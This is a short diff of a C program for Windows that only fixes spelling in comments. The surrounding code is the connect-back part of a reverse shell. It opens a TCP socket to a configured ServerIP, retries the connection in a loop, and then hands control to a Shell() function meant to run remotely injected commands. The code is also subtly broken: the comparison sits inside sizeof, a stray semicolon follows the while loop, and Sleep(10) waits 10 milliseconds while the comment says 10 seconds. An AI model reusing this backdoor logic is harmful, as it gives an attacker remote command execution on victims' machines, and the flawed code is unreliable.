@@ -56,7 +56,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
         if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){  						//iniates Winsock DLL
                 exit(1);
         }
-        sock = socket(AF_INET, SOCK_STREAM, 0);   						//estabilishing socket connection by IPV4 and TCP Protocol
+        sock = socket(AF_INET, SOCK_STREAM, 0);   						//establishing socket connection by IPV4 and TCP Protocol
         memset(&ServerAddress, 0, sizeof(ServerAddress));  					//clear the variables
         ServerAddress.sin_family = AF_INET;   							//binding the ports with IPV4
         ServerAddress.sin_addr.s_addr = inet_addr(ServerIP);
@@ -64,7 +64,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
         start:
         while (connect(sock, (struct sockAddr *) &ServerAddress, sizeof(ServerAddress) != 0)); {
-                Sleep(10);									//try to estabilish the connection every 10s
+                Sleep(10);									//try to establish the connection every 10s
                 goto start;
         }
         Shell();										//calls upon the shell() function for injection of commands
